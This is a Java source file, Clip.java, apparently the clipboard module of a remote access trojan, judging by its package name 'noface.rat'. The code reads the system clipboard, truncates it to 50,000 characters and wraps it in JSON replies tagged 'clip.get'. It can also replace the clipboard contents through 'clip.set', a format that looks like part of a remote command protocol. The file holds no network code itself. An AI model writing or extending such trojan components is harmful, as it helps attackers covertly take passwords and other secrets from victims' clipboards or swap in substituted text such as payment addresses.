package noface.rat;

import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.StringSelection;

public final class Clip {

    public static String get() {
        try {
            Clipboard c = Toolkit.getDefaultToolkit().getSystemClipboard();
            Object data = c.getData(DataFlavor.stringFlavor);
            String text = data == null ? "" : String.valueOf(data);
            if (text.length() > 50_000) text = text.substring(0, 50_000);
            return "{\"op\":\"clip.get\",\"text\":\"" + esc(text) + "\"}";
        } catch (Exception e) {
            return "{\"op\":\"clip.get\",\"err\":\"" + esc(e.getMessage()) + "\"}";
        }
    }

    public static String set(String text) {
        try {
            Clipboard c = Toolkit.getDefaultToolkit().getSystemClipboard();
            c.setContents(new StringSelection(text == null ? "" : text), null);
            return "{\"op\":\"clip.set\",\"ok\":true}";
        } catch (Exception e) {
            return "{\"op\":\"clip.set\",\"err\":\"" + esc(e.getMessage()) + "\"}";
        }
    }

    private static String esc(String s) {
        if (s == null) return "";
        StringBuilder b = new StringBuilder(s.length() + 8);
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '\\' -> b.append("\\\\");
                case '"' -> b.append("\\\"");
                case '\n' -> b.append("\\n");
                case '\r' -> b.append("\\r");
                case '\t' -> b.append("\\t");
                default -> {
                    if (c < 32) b.append(' ');
                    else b.append(c);
                }
            }
        }
        return b.toString();
    }

    private Clip() {}
}
